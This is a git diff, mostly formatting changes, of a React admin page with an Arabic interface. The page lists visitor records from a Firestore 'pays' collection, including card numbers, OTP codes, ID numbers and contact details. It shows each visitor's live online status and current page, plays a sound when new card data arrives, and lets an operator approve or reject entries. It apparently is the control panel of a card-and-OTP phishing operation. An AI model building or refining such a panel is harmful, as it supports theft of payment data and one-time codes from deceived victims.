-  const [selectedInfo, setSelectedInfo] = useState<"personal" | "card" | null>(null)
-  const [selectedNotification, setSelectedNotification] = useState<Notification | null>(null)
-  const [filterType, setFilterType] = useState<"all" | "card" | "online" | "pending">("all")
-  const [searchTerm, setSearchTerm] = useState("")
-  const [currentPage, setCurrentPage] = useState(1)
-  const [itemsPerPage, setItemsPerPage] = useState(10)
-  const [settingsOpen, setSettingsOpen] = useState(false)
-  const [exportDialogOpen, setExportDialogOpen] = useState(false)
-  const [mobileMenuOpen, setMobileMenuOpen] = useState(false)
-  const [sortBy, setSortBy] = useState<"date" | "status" | "country">("date")
-  const [sortOrder, setSortOrder] = useState<"asc" | "desc">("desc")
-  const [showStatistics, setShowStatistics] = useState(true)
-  const [selectedIds, setSelectedIds] = useState<Set<string>>(new Set())
+  const [notifications, setNotifications] = useState<Notification[]>([]);
+  const [isLoading, setIsLoading] = useState(true);
+  const [selectedInfo, setSelectedInfo] = useState<"personal" | "card" | null>(
+    null,
+  );
+  const [selectedNotification, setSelectedNotification] =
+    useState<Notification | null>(null);
+  const [filterType, setFilterType] = useState<
+    "all" | "card" | "online" | "pending"
+  >("all");
+  const [searchTerm, setSearchTerm] = useState("");
+  const [currentPage, setCurrentPage] = useState(1);
+  const [itemsPerPage, setItemsPerPage] = useState(10);
+  const [settingsOpen, setSettingsOpen] = useState(false);
+  const [exportDialogOpen, setExportDialogOpen] = useState(false);
+  const [mobileMenuOpen, setMobileMenuOpen] = useState(false);
+  const [sortBy, setSortBy] = useState<"date" | "status" | "country">("date");
+  const [sortOrder, setSortOrder] = useState<"asc" | "desc">("desc");
+  const [showStatistics, setShowStatistics] = useState(true);
+  const [selectedIds, setSelectedIds] = useState<Set<string>>(new Set());
 
-  const router = useRouter()
-  const onlineUsersCount = useOnlineUsersCount()
+  const router = useRouter();
+  const onlineUsersCount = useOnlineUsersCount();
 
   // Track online status for all notifications
-  const [onlineStatuses, setOnlineStatuses] = useState<Record<string, boolean>>({})
+  const [onlineStatuses, setOnlineStatuses] = useState<Record<string, boolean>>(
+    {},
+  );
 
   // Effect to track online status for all notifications
   useEffect(() => {
-    const statusRefs: { [key: string]: () => void } = {}
+    const statusRefs: { [key: string]: () => void } = {};
 
     notifications.forEach((notification) => {
-      const userStatusRef = ref(database, `/status/${notification.id}`)
+      const userStatusRef = ref(database, `/status/${notification.id}`);
 
       const callback = onValue(userStatusRef, (snapshot) => {
-        const data = snapshot.val()
+        const data = snapshot.val();
         setOnlineStatuses((prev) => ({
           ...prev,
           [notification.id]: data && data.state === "online",
-        }))
-      })
+        }));
+      });
 
-      statusRefs[notification.id] = callback
-    })
+      statusRefs[notification.id] = callback;
+    });
 
     // Cleanup function
     return () => {
       Object.values(statusRefs).forEach((unsubscribe) => {
         if (typeof unsubscribe === "function") {
-          unsubscribe()
+          unsubscribe();
         }
-      })
-    }
-  }, [notifications])
+      });
+    };
+  }, [notifications]);
 
   // Statistics calculations
-  const totalVisitorsCount = notifications.length
-  const cardSubmissionsCount = notifications.filter((n) => n.cardNumber).length
-  const approvedCount = notifications.filter((n) => n.status === "approved").length
-  const pendingCount = notifications.filter((n) => n.status === "pending").length
+  const totalVisitorsCount = notifications.length;
+  const cardSubmissionsCount = notifications.filter((n) => n.cardNumber).length;
+  const approvedCount = notifications.filter(
+    (n) => n.status === "approved",
+  ).length;
+  const pendingCount = notifications.filter(
+    (n) => n.status === "pending",
+  ).length;
 
   // Filter and search notifications
   const filteredNotifications = useMemo(() => {
-    let filtered = notifications
+    let filtered = notifications;
 
     // Apply filter type
     if (filterType === "card") {
-      filtered = filtered.filter((notification) => notification.cardNumber)
+      filtered = filtered.filter((notification) => notification.cardNumber);
     } else if (filterType === "online") {
-      filtered = filtered.filter((notification) => onlineStatuses[notification.id])
+      filtered = filtered.filter(
+        (notification) => onlineStatuses[notification.id],
+      );
     } else if (filterType === "pending") {
-      filtered = filtered.filter((notification) => notification.status === "pending")
+      filtered = filtered.filter(
+        (notification) => notification.status === "pending",
+      );
     }
 
     // Apply search term
     if (searchTerm) {
-      const term = searchTerm.toLowerCase()
+      const term = searchTerm.toLowerCase();
       filtered = filtered.filter(
         (notification) =>
           notification.name?.toLowerCase().includes(term) ||
@@ -1059,286 +1253,320 @@ export default function NotificationsPage() {
           notification.country?.toLowerCase().includes(term) ||
           notification.otp?.toLowerCase().includes(term) ||
           notification.idNumber?.toLowerCase().includes(term),
-      )
+      );
     }
 
     // Apply sorting
     filtered.sort((a, b) => {
-      let aValue: any, bValue: any
+      let aValue: any, bValue: any;
 
       switch (sortBy) {
         case "date":
-          aValue = new Date(a.createdDate)
-          bValue = new Date(b.createdDate)
-          break
+          aValue = new Date(a.createdDate);
+          bValue = new Date(b.createdDate);
+          break;
         case "status":
-          aValue = a.status
-          bValue = b.status
-          break
+          aValue = a.status;
+          bValue = b.status;
+          break;
         case "country":
-          aValue = a.country || ""
-          bValue = b.country || ""
-          break
+          aValue = a.country || "";
+          bValue = b.country || "";
+          break;
         default:
-          return 0
+          return 0;
       }
 
       if (sortOrder === "asc") {
-        return aValue > bValue ? 1 : -1
+        return aValue > bValue ? 1 : -1;
       } else {
-        return aValue < bValue ? 1 : -1
+        return aValue < bValue ? 1 : -1;
       }
-    })
+    });
 
-    return filtered
-  }, [filterType, notifications, onlineStatuses, searchTerm, sortBy, sortOrder])
+    return filtered;
+  }, [
+    filterType,
+    notifications,
+    onlineStatuses,
+    searchTerm,
+    sortBy,
+    sortOrder,
+  ]);
 
   // Paginate notifications
   const paginatedNotifications = useMemo(() => {
-    const startIndex = (currentPage - 1) * itemsPerPage
-    return filteredNotifications.slice(startIndex, startIndex + itemsPerPage)
-  }, [filteredNotifications, currentPage, itemsPerPage])
+    const startIndex = (currentPage - 1) * itemsPerPage;
+    return filteredNotifications.slice(startIndex, startIndex + itemsPerPage);
+  }, [filteredNotifications, currentPage, itemsPerPage]);
 
-  const totalPages = Math.max(1, Math.ceil(filteredNotifications.length / itemsPerPage))
+  const totalPages = Math.max(
+    1,
+    Math.ceil(filteredNotifications.length / itemsPerPage),
+  );
 
   // Reset to first page when filter or search changes
   useEffect(() => {
-    setCurrentPage(1)
-  }, [filterType, searchTerm])
+    setCurrentPage(1);
+  }, [filterType, searchTerm]);
 
   // Firebase authentication and data fetching
   useEffect(() => {
     const unsubscribe = onAuthStateChanged(auth, (user) => {
       if (!user) {
-        router.push("/login")
+        router.push("/login");
       } else {
-        const unsubscribeNotifications = fetchNotifications()
+        const unsubscribeNotifications = fetchNotifications();
         return () => {
-          unsubscribeNotifications()
-        }
+          unsubscribeNotifications();
+        };
       }
-    })
+    });
 
-    return () => unsubscribe()
-  }, [router])
+    return () => unsubscribe();
+  }, [router]);
 
   const fetchNotifications = () => {
-    setIsLoading(true)
-    const q = query(collection(db, "pays"), orderBy("createdDate", "desc"))
+    setIsLoading(true);
+    const q = query(collection(db, "pays"), orderBy("createdDate", "desc"));
     const unsubscribe = onSnapshot(
       q,
       (querySnapshot) => {
         const notificationsData = querySnapshot.docs
           .map((doc) => {
-            const data = doc.data() as any
-            return { id: doc.id, ...data }
+            const data = doc.data() as any;
+            return { id: doc.id, ...data };
           })
-          .filter((notification: any) => !notification.isHidden) as Notification[]
+          .filter(
+            (notification: any) => !notification.isHidden,
+          ) as Notification[];
 
         // Check if there are any new notifications with card info or general info
         const hasNewCardInfo = notificationsData.some(
           (notification) =>
-            notification.cardNumber && !notifications.some((n) => n.id === notification.id && n.cardNumber),
-        )
+            notification.cardNumber &&
+            !notifications.some(
+              (n) => n.id === notification.id && n.cardNumber,
+            ),
+        );
         const hasNewGeneralInfo = notificationsData.some(
           (notification) =>
-            (notification.idNumber || notification.email || notification.mobile) &&
-            !notifications.some((n) => n.id === notification.id && (n.idNumber || n.email || n.mobile)),
-        )
+            (notification.idNumber ||
+              notification.email ||
+              notification.mobile) &&
+            !notifications.some(
+              (n) =>
+                n.id === notification.id && (n.idNumber || n.email || n.mobile),
+            ),
+        );
 
         // Only play notification sound if new card info or general info is added
         if (hasNewCardInfo || hasNewGeneralInfo) {
-          playNotificationSound()
+          playNotificationSound();
         }
 
-        setNotifications(notificationsData)
-        setIsLoading(false)
+        setNotifications(notificationsData);
+        setIsLoading(false);
       },
       (error) => {
-        console.error("Error fetching notifications:", error)
-        setIsLoading(false)
+        console.error("Error fetching notifications:", error);
+        setIsLoading(false);
         toast({
           title: "خطأ في جلب البيانات",
           description: "حدث خطأ أثناء جلب الإشعارات",
           variant: "destructive",
-        })
+        });
       },
-    )
+    );
 
-    return unsubscribe
-  }
+    return unsubscribe;
+  };
 
-  const handleInfoClick = (notification: Notification, infoType: "personal" | "card") => {
-    setSelectedNotification(notification)
-    setSelectedInfo(infoType)
-  }
+  const handleInfoClick = (
+    notification: Notification,
+    infoType: "personal" | "card",
+  ) => {
+    setSelectedNotification(notification);
+    setSelectedInfo(infoType);
+  };
 
   const closeDialog = () => {
-    setSelectedInfo(null)
-    setSelectedNotification(null)
-  }
+    setSelectedInfo(null);
+    setSelectedNotification(null);
+  };
 
   const handleToggleStatistics = () => {
-    setShowStatistics(!showStatistics)
-  }
+    setShowStatistics(!showStatistics);
+  };
 
   const handleFlagColorChange = async (id: string, color: any) => {
     try {
       // Update in Firestore
-      const docRef = doc(db, "pays", id)
-      await updateDoc(docRef, { flagColor: color })
+      const docRef = doc(db, "pays", id);
+      await updateDoc(docRef, { flagColor: color });
 
       // Update local state
       setNotifications(
         notifications.map((notification) =>
-          notification.id === id ? { ...notification, flagColor: color } : notification,
+          notification.id === id
+            ? { ...notification, flagColor: color }
+            : notification,
         ),
-      )
+      );
 
       toast({
         title: "تم تحديث العلامة",
-        description: color ? "تم تحديث لون العلامة بنجاح" : "تمت إزالة العلامة بنجاح",
+        description: color
+          ? "تم تحديث لون العلامة بنجاح"
+          : "تمت إزالة العلامة بنجاح",
         variant: "default",
-      })
+      });
     } catch (error) {
-      console.error("Error updating flag color:", error)
+      console.error("Error updating flag color:", error);
       toast({
         title: "خطأ",
         description: "حدث خطأ أثناء تحديث لون العلامة",
         variant: "destructive",
-      })
+      });
     }
-  }
+  };
 
   const handleApproval = async (state: string, id: string) => {
     try {
-      const targetPost = doc(db, "pays", id)
+      const targetPost = doc(db, "pays", id);
       await updateDoc(targetPost, {
         status: state,
-      })
+      });
       toast({
         title: state === "approved" ? "تمت الموافقة" : "تم الرفض",
-        description: state === "approved" ? "تمت الموافقة على الإشعار بنجاح" : "تم رفض الإشعار بنجاح",
+        description:
+          state === "approved"
+            ? "تمت الموافقة على الإشعار بنجاح"
+            : "تم رفض الإشعار بنجاح",
         variant: "default",
-      })
+      });
     } catch (error) {
-      console.error("Error updating notification status:", error)
+      console.error("Error updating notification status:", error);
       toast({
         title: "خطأ",
         description: "حدث خطأ أثناء تحديث حالة الإشعار",
         variant: "destructive",
-      })
+      });
     }
-  }
+  };
 
   const handleDelete = async (id: string) => {
     try {
-      const docRef = doc(db, "pays", id)
-      await updateDoc(docRef, { isHidden: true })
-      setNotifications(notifications.filter((notification) => notification.id !== id))
+      const docRef = doc(db, "pays", id);
+      await updateDoc(docRef, { isHidden: true });
+      setNotifications(
+        notifications.filter((notification) => notification.id !== id),
+      );
       toast({
         title: "تم مسح الإشعار",
         description: "تم مسح الإشعار بنجاح",
         variant: "default",
-      })
+      });
     } catch (error) {
-      console.error("Error hiding notification:", error)
+      console.error("Error hiding notification:", error);
       toast({
         title: "خطأ",
         description: "حدث خطأ أثناء مسح الإشعار",
         variant: "destructive",
-      })
+      });
     }
-  }
+  };
 
   const handleClearAll = async () => {
-    if (!confirm("هل أنت متأكد من حذف جميع الإشعارات؟")) return
+    if (!confirm("هل أنت متأكد من حذف جميع الإشعارات؟")) return;
 
-    setIsLoading(true)
+    setIsLoading(true);
     try {
-      const batch = writeBatch(db)
+      const batch = writeBatch(db);
       notifications.forEach((notification) => {
-        const docRef = doc(db, "pays", notification.id)
-        batch.update(docRef, { isHidden: true })
-      })
-      await batch.commit()
-      setNotifications([])
+        const docRef = doc(db, "pays", notification.id);
+        batch.update(docRef, { isHidden: true });
+      });
+      await batch.commit();
+      setNotifications([]);
       toast({
         title: "تم مسح جميع الإشعارات",
         description: "تم مسح جميع الإشعارات بنجاح",
         variant: "default",
-      })
+      });
     } catch (error) {
-      console.error("Error hiding all notifications:", error)
+      console.error("Error hiding all notifications:", error);
       toast({
         title: "خطأ",
         description: "حدث خطأ أثناء مسح الإشعارات",
         variant: "destructive",
-      })
+      });
     } finally {
-      setIsLoading(false)
+      setIsLoading(false);
     }
-  }
+  };
 
   const handleLogout = async () => {
     try {
-      await signOut(auth)
-      router.push("/login")
+      await signOut(auth);
+      router.push("/login");
     } catch (error) {
-      console.error("Error signing out:", error)
+      console.error("Error signing out:", error);
       toast({
         title: "خطأ",
         description: "حدث خطأ أثناء تسجيل الخروج",
         variant: "destructive",
-      })
+      });
     }
-  }
+  };
 
   const handleSearch = (term: string) => {
-    setSearchTerm(term)
-  }
+    setSearchTerm(term);
+  };
 
   const handlePageChange = (page: number) => {
-    setCurrentPage(page)
-    window.scrollTo({ top: 0, behavior: "smooth" })
-  }
+    setCurrentPage(page);
+    window.scrollTo({ top: 0, behavior: "smooth" });
+  };
 
   const handleRefresh = () => {
-    setIsLoading(true)
-    fetchNotifications()
+    setIsLoading(true);
+    fetchNotifications();
     toast({
       title: "تم التحديث",
       description: "تم تحديث البيانات بنجاح",
-    })
-  }
+    });
+  };
 
   const toggleSort = (column: "date" | "status" | "country") => {
     if (sortBy === column) {
-      setSortOrder(sortOrder === "asc" ? "desc" : "asc")
+      setSortOrder(sortOrder === "asc" ? "desc" : "asc");
     } else {
-      setSortBy(column)
-      setSortOrder("desc")
+      setSortBy(column);
+      setSortOrder("desc");
     }
-  }
+  };
 
   // Keyboard shortcuts
   useEffect(() => {
     const handleKeyPress = (e: KeyboardEvent) => {
       // Focus search on "/"
       if (e.key === "/" && !e.ctrlKey && !e.metaKey) {
-        e.preventDefault()
-        document.querySelector<HTMLInputElement>('input[type="search"]')?.focus()
+        e.preventDefault();
+        document
+          .querySelector<HTMLInputElement>('input[type="search"]')
+          ?.focus();
       }
       // Refresh on Ctrl+R or Cmd+R
       if ((e.ctrlKey || e.metaKey) && e.key === "r") {
-        e.preventDefault()
-        handleRefresh()
+        e.preventDefault();
+        handleRefresh();
       }
-    }
+    };
 
-    document.addEventListener("keydown", handleKeyPress)
-    return () => document.removeEventListener("keydown", handleKeyPress)
-  }, [])
+    document.addEventListener("keydown", handleKeyPress);
+    return () => document.removeEventListener("keydown", handleKeyPress);
+  }, []);
 
   if (isLoading && notifications.length === 0) {
     return (
@@ -1352,25 +1580,34 @@ export default function NotificationsPage() {
             <div className="absolute inset-0 rounded-full bg-gradient-to-r from-emerald-500 to-teal-500 blur-xl opacity-50 animate-pulse" />
             <div className="relative h-16 w-16 animate-spin rounded-full border-4 border-slate-700 border-t-emerald-500"></div>
           </div>
-          <div className="text-xl font-semibold text-white">جاري التحميل...</div>
+          <div className="text-xl font-semibold text-white">
+            جاري التحميل...
+          </div>
           <div className="text-sm text-slate-400">يرجى الانتظار</div>
         </div>
       </div>
-    )
+    );
   }
 
   // Sample data for mini charts (you can replace with real trend data)
-  const visitorTrend = [5, 8, 12, 7, 10, 15, 13]
-  const cardTrend = [2, 3, 5, 4, 6, 8, 7]
-  const onlineTrend = [3, 4, 6, 5, 7, 8, 6]
-  const approvedTrend = [1, 2, 4, 3, 5, 7, 6]
+  const visitorTrend = [5, 8, 12, 7, 10, 15, 13];
+  const cardTrend = [2, 3, 5, 4, 6, 8, 7];
+  const onlineTrend = [3, 4, 6, 5, 7, 8, 6];
+  const approvedTrend = [1, 2, 4, 3, 5, 7, 6];
 
   return (
     <>
-      <div dir="rtl" className="min-h-screen bg-gradient-to-br from-slate-950 via-slate-900 to-slate-950 text-white">
+      <div
+        dir="rtl"
+        className="min-h-screen bg-gradient-to-br from-slate-950 via-slate-900 to-slate-950 text-white"
+      >
         {/* Mobile menu */}
         <Sheet open={mobileMenuOpen} onOpenChange={setMobileMenuOpen}>
-          <SheetContent side="right" className="w-[280px] sm:w-[350px]" dir="rtl">
+          <SheetContent
+            side="right"
+            className="w-[280px] sm:w-[350px]"
+            dir="rtl"
+          >
             <SheetHeader className="mb-6">
               <SheetTitle className="flex items-center gap-2">
                 <Bell className="h-5 w-5 text-primary" />
@@ -1381,11 +1618,15 @@ export default function NotificationsPage() {
               <div className="flex items-center gap-4">
                 <Avatar className="h-12 w-12">
                   <AvatarImage src="/placeholder.svg" alt="صورة المستخدم" />
-                  <AvatarFallback className="bg-gradient-to-br from-primary to-primary/80 text-white">م</AvatarFallback>
+                  <AvatarFallback className="bg-gradient-to-br from-primary to-primary/80 text-white">
+                    م
+                  </AvatarFallback>
                 </Avatar>
                 <div>
                   <p className="font-medium">مدير النظام</p>
-                  <p className="text-sm text-muted-foreground">admin@example.com</p>
+                  <p className="text-sm text-muted-foreground">
+                    admin@example.com
+                  </p>
                 </div>
               </div>
               <Separator />
@@ -1394,8 +1635,8 @@ export default function NotificationsPage() {
                   variant="ghost"
                   className="w-full justify-start"
                   onClick={() => {
-                    setMobileMenuOpen(false)
-                    handleToggleStatistics()
+                    setMobileMenuOpen(false);
+                    handleToggleStatistics();
                   }}
                 >
                   <Activity className="mr-2 h-4 w-4" />
@@ -1405,8 +1646,8 @@ export default function NotificationsPage() {
                   variant="ghost"
                   className="w-full justify-start"
                   onClick={() => {
-                    setMobileMenuOpen(false)
-                    setSettingsOpen(true)
+                    setMobileMenuOpen(false);
+                    setSettingsOpen(true);
                   }}
                 >
                   <Settings className="mr-2 h-4 w-4" />
@@ -1416,8 +1657,8 @@ export default function NotificationsPage() {
                   variant="ghost"
                   className="w-full justify-start"
                   onClick={() => {
-                    setMobileMenuOpen(false)
-                    setExportDialogOpen(true)
+                    setMobileMenuOpen(false);
+                    setExportDialogOpen(true);
                   }}
                 >
                   <Download className="mr-2 h-4 w-4" />
@@ -1427,8 +1668,8 @@ export default function NotificationsPage() {
                   variant="ghost"
                   className="w-full justify-start"
                   onClick={() => {
-                    setMobileMenuOpen(false)
-                    handleRefresh()
+                    setMobileMenuOpen(false);
+                    handleRefresh();
                   }}
                 >
                   <RefreshCw className="mr-2 h-4 w-4" />
@@ -1459,7 +1700,12 @@ export default function NotificationsPage() {
         <header className="sticky top-0 z-50 border-b border-slate-800/50 bg-slate-900/80 backdrop-blur-xl shadow-lg shadow-black/20">
           <div className="flex items-center justify-between p-4">
             <div className="flex items-center gap-4">
-              <Button variant="ghost" size="icon" className="md:hidden" onClick={() => setMobileMenuOpen(true)}>
+              <Button
+                variant="ghost"
+                size="icon"
+                className="md:hidden"
+                onClick={() => setMobileMenuOpen(true)}
+              >
                 <Menu className="h-5 w-5" />
               </Button>
               <div className="flex items-center gap-3">
@@ -1490,8 +1736,16 @@ export default function NotificationsPage() {
               <TooltipProvider>
                 <Tooltip>
                   <TooltipTrigger asChild>
-                    <Button variant="outline" size="icon" onClick={handleRefresh} disabled={isLoading} className="border-slate-700 bg-slate-800/50 hover:bg-slate-700/50 text-slate-300 hover:text-emerald-400">
-                      <RefreshCw className={`h-4 w-4 ${isLoading ? "animate-spin" : ""}`} />
+                    <Button
+                      variant="outline"
+                      size="icon"
+                      onClick={handleRefresh}
+                      disabled={isLoading}
+                      className="border-slate-700 bg-slate-800/50 hover:bg-slate-700/50 text-slate-300 hover:text-emerald-400"
+                    >
+                      <RefreshCw
+                        className={`h-4 w-4 ${isLoading ? "animate-spin" : ""}`}
+                      />
                     </Button>
                   </TooltipTrigger>
                   <TooltipContent>
@@ -1503,40 +1757,67 @@ export default function NotificationsPage() {
               <TooltipProvider>
                 <Tooltip>
                   <TooltipTrigger asChild>
-                    <Button variant="outline" size="icon" onClick={handleToggleStatistics} className="border-slate-700 bg-slate-800/50 hover:bg-slate-700/50 text-slate-300 hover:text-emerald-400">
+                    <Button
+                      variant="outline"
+                      size="icon"
+                      onClick={handleToggleStatistics}
+                      className="border-slate-700 bg-slate-800/50 hover:bg-slate-700/50 text-slate-300 hover:text-emerald-400"
+                    >
                       <Activity className="h-4 w-4" />
                     </Button>
                   </TooltipTrigger>
                   <TooltipContent>
-                    <p>{showStatistics ? "إخفاء الإحصائيات" : "عرض الإحصائيات"}</p>
+                    <p>
+                      {showStatistics ? "إخفاء الإحصائيات" : "عرض الإحصائيات"}
+                    </p>
                   </TooltipContent>
                 </Tooltip>
               </TooltipProvider>
 
               <DropdownMenu>
                 <DropdownMenuTrigger asChild>
-                  <Button variant="outline" size="icon" className="border-slate-700 bg-slate-800/50 hover:bg-slate-700/50 text-slate-300 hover:text-emerald-400">
+                  <Button
+                    variant="outline"
+                    size="icon"
+                    className="border-slate-700 bg-slate-800/50 hover:bg-slate-700/50 text-slate-300 hover:text-emerald-400"
+                  >
                     <User className="h-4 w-4" />
                   </Button>
                 </DropdownMenuTrigger>
-                <DropdownMenuContent align="end" className="w-56 bg-slate-900 border-slate-700" >
+                <DropdownMenuContent
+                  align="end"
+                  className="w-56 bg-slate-900 border-slate-700"
+                >
                   <DropdownMenuLabel className="font-normal">
                     <div className="flex flex-col space-y-1">
-                      <p className="text-sm font-medium text-white">مدير النظام</p>
-                      <p className="text-xs text-slate-400">admin@example.com</p>
+                      <p className="text-sm font-medium text-white">
+                        مدير النظام
+                      </p>
+                      <p className="text-xs text-slate-400">
+                        admin@example.com
+                      </p>
                     </div>
                   </DropdownMenuLabel>
                   <DropdownMenuSeparator className="bg-slate-700" />
-                  <DropdownMenuItem onClick={() => setSettingsOpen(true)} className="text-slate-300 hover:text-white focus:bg-slate-800">
+                  <DropdownMenuItem
+                    onClick={() => setSettingsOpen(true)}
+                    className="text-slate-300 hover:text-white focus:bg-slate-800"
+                  >
                     <Settings className="ml-2 h-4 w-4" />
                     <span>الإعدادات</span>
                   </DropdownMenuItem>
-                  <DropdownMenuItem onClick={() => setExportDialogOpen(true)} className="text-slate-300 hover:text-white focus:bg-slate-800">
+                  <DropdownMenuItem
+                    onClick={() => setExportDialogOpen(true)}
+                    className="text-slate-300 hover:text-white focus:bg-slate-800"
+                  >
                     <Download className="ml-2 h-4 w-4" />
                     <span>تصدير البيانات</span>
                   </DropdownMenuItem>
                   <DropdownMenuSeparator className="bg-slate-700" />
-                  <DropdownMenuItem onClick={handleLogout} className="text-red-400 hover:text-red-300 focus:bg-slate-800">
+                  <DropdownMenuItem
+                    onClick={handleLogout}
+                    className="text-red-400 hover:text-red-300 focus:bg-slate-800"
+                  >
                     <LogOut className="ml-2 h-4 w-4" />
                     <span>تسجيل الخروج</span>
                   </DropdownMenuItem>
@@ -1600,34 +1881,64 @@ export default function NotificationsPage() {
                     className="w-full sm:w-auto"
                   >
                     <TabsList className="grid grid-cols-4 w-full sm:w-auto bg-slate-800/50 border border-slate-700/50">
-                      <TabsTrigger value="all" className="flex items-center gap-1 text-slate-400 data-[state=active]:bg-emerald-600 data-[state=active]:text-white">
+                      <TabsTrigger
+                        value="all"
+                        className="flex items-center gap-1 text-slate-400 data-[state=active]:bg-emerald-600 data-[state=active]:text-white"
+                      >
                         <Filter className="h-3 w-3" />
                         الكل
                       </TabsTrigger>
-                      <TabsTrigger value="pending" className="flex items-center gap-1 text-slate-400 data-[state=active]:bg-amber-600 data-[state=active]:text-white">
+                      <TabsTrigger
+                        value="pending"
+                        className="flex items-center gap-1 text-slate-400 data-[state=active]:bg-amber-600 data-[state=active]:text-white"
+                      >
                         <Clock className="h-3 w-3" />
                         معلق
                       </TabsTrigger>
-                      <TabsTrigger value="card" className="flex items-center gap-1 text-slate-400 data-[state=active]:bg-violet-600 data-[state=active]:text-white">
+                      <TabsTrigger
+                        value="card"
+                        className="flex items-center gap-1 text-slate-400 data-[state=active]:bg-violet-600 data-[state=active]:text-white"
+                      >
                         <CreditCard className="h-3 w-3" />
                         بطاقات
                       </TabsTrigger>
-                      <TabsTrigger value="online" className="flex items-center gap-1 text-slate-400 data-[state=active]:bg-cyan-600 data-[state=active]:text-white">
+                      <TabsTrigger
+                        value="online"
+                        className="flex items-center gap-1 text-slate-400 data-[state=active]:bg-cyan-600 data-[state=active]:text-white"
+                      >
                         <UserCheck className="h-3 w-3" />
                         متصل
                       </TabsTrigger>
                     </TabsList>
                   </Tabs>
 
-                  <Select value={sortBy} onValueChange={(value: any) => setSortBy(value)}>
+                  <Select
+                    value={sortBy}
+                    onValueChange={(value: any) => setSortBy(value)}
+                  >
                     <SelectTrigger className="w-full sm:w-[180px] bg-slate-800/50 border-slate-700/50 text-slate-300">
                       <ArrowUpDown className="h-4 w-4 ml-2 text-emerald-400" />
                       <SelectValue placeholder="ترتيب حسب" />
                     </SelectTrigger>
                     <SelectContent className="bg-slate-900 border-slate-700">
-                      <SelectItem value="date" className="text-slate-300 focus:bg-slate-800 focus:text-white">التاريخ</SelectItem>
-                      <SelectItem value="status" className="text-slate-300 focus:bg-slate-800 focus:text-white">الحالة</SelectItem>
-                      <SelectItem value="country" className="text-slate-300 focus:bg-slate-800 focus:text-white">الدولة</SelectItem>
+                      <SelectItem
+                        value="date"
+                        className="text-slate-300 focus:bg-slate-800 focus:text-white"
+                      >
+                        التاريخ
+                      </SelectItem>
+                      <SelectItem
+                        value="status"
+                        className="text-slate-300 focus:bg-slate-800 focus:text-white"
+                      >
+                        الحالة
+                      </SelectItem>
+                      <SelectItem
+                        value="country"
+                        className="text-slate-300 focus:bg-slate-800 focus:text-white"
+                      >
+                        الدولة
+                      </SelectItem>
                     </SelectContent>
                   </Select>
                 </div>
@@ -1649,11 +1960,16 @@ export default function NotificationsPage() {
                     إدارة الإشعارات
                   </CardTitle>
                   <CardDescription className="mt-1 text-slate-400">
-                    عرض وإدارة جميع الإشعارات والبيانات المستلمة ({filteredNotifications.length} إشعار)
+                    عرض وإدارة جميع الإشعارات والبيانات المستلمة (
+                    {filteredNotifications.length} إشعار)
                   </CardDescription>
                 </div>
                 {notifications.length > 0 && (
-                  <Button variant="destructive" size="sm" onClick={handleClearAll}>
+                  <Button
+                    variant="destructive"
+                    size="sm"
+                    onClick={handleClearAll}
+                  >
                     <Trash2 className="h-4 w-4 ml-2" />
                     مسح الكل
                   </Button>
@@ -1666,7 +1982,9 @@ export default function NotificationsPage() {
                   <div className="rounded-full bg-slate-800/50 p-6 mb-4">
                     <AlertCircle className="h-12 w-12 text-slate-500" />
                   </div>
-                  <h3 className="text-xl font-semibold mb-2 text-white">لا توجد إشعارات</h3>
+                  <h3 className="text-xl font-semibold mb-2 text-white">
+                    لا توجد إشعارات
+                  </h3>
                   <p className="text-slate-400 text-center">
                     {searchTerm || filterType !== "all"
                       ? "لم يتم العثور على نتائج مطابقة للفلاتر المحددة"
@@ -1691,13 +2009,22 @@ export default function NotificationsPage() {
                           <th
                             key={heading.label}
                             className={`px-6 py-4 text-right font-semibold text-slate-300 ${
-                              heading.sortKey ? "cursor-pointer hover:bg-slate-700/50 transition-colors" : ""
+                              heading.sortKey
+                                ? "cursor-pointer hover:bg-slate-700/50 transition-colors"
+                                : ""
                             }`}
-                            onClick={heading.sortKey ? () => toggleSort(heading.sortKey as any) : undefined}
+                            onClick={
+                              heading.sortKey
+                                ? () => toggleSort(heading.sortKey as any)
+                                : undefined
+                            }
                           >
                             <div className="flex items-center gap-2 justify-end">
                               {heading.label}
-                              {heading.sortKey && sortBy === heading.sortKey && <ArrowUpDown className="h-3 w-3 text-emerald-400" />}
+                              {heading.sortKey &&
+                                sortBy === heading.sortKey && (
+                                  <ArrowUpDown className="h-3 w-3 text-emerald-400" />
+                                )}
                             </div>
                           </th>
                         ))}
@@ -1715,14 +2042,18 @@ export default function NotificationsPage() {
                               <div className="w-8 h-8 rounded-full bg-gradient-to-br from-emerald-500/20 to-teal-500/10 flex items-center justify-center">
                                 <MapPin className="h-4 w-4 text-emerald-400" />
                               </div>
-                              <span className="font-medium text-white">{notification.country || "غير معروف"}</span>
+                              <span className="font-medium text-white">
+                                {notification.country || "غير معروف"}
+                              </span>
                             </div>
                           </td>
                           <td className="px-6 py-4">
                             <div className="flex flex-wrap gap-2">
                               <InfoBadge
                                 active={notification.phone || notification.name}
-                                onClick={() => handleInfoClick(notification, "personal")}
+                                onClick={() =>
+                                  handleInfoClick(notification, "personal")
+                                }
                                 icon={User}
                                 text="معلومات شخصية"
                                 inactiveText="لا يوجد معلومات"
@@ -1730,7 +2061,9 @@ export default function NotificationsPage() {
                               />
                               <InfoBadge
                                 active={notification.cardNumber}
-                                onClick={() => handleInfoClick(notification, "card")}
+                                onClick={() =>
+                                  handleInfoClick(notification, "card")
+                                }
                                 icon={CreditCard}
                                 text="معلومات البطاقة"
                                 inactiveText="لا يوجد بطاقة"
@@ -1746,10 +2079,13 @@ export default function NotificationsPage() {
                               <Clock className="h-4 w-4 flex-shrink-0 text-slate-500" />
                               <span className="whitespace-nowrap">
                                 {notification.createdDate &&
-                                  formatDistanceToNow(new Date(notification.createdDate), {
-                                    addSuffix: true,
-                                    locale: ar,
-                                  })}
+                                  formatDistanceToNow(
+                                    new Date(notification.createdDate),
+                                    {
+                                      addSuffix: true,
+                                      locale: ar,
+                                    },
+                                  )}
                               </span>
                             </div>
                           </td>
@@ -1770,7 +2106,12 @@ export default function NotificationsPage() {
                           </td>
                           <td className="px-6 py-4 text-center">
                             {notification?.currentPage ? (
-                              <Badge variant="outline" className="bg-slate-800/50 text-slate-300 border-slate-700">{notification.currentPage}</Badge>
+                              <Badge
+                                variant="outline"
+                                className="bg-slate-800/50 text-slate-300 border-slate-700"
+                              >
+                                {notification.currentPage}
+                              </Badge>
                             ) : (
                               <span className="text-slate-500 text-sm">-</span>
                             )}
@@ -1807,13 +2148,24 @@ export default function NotificationsPage() {
 
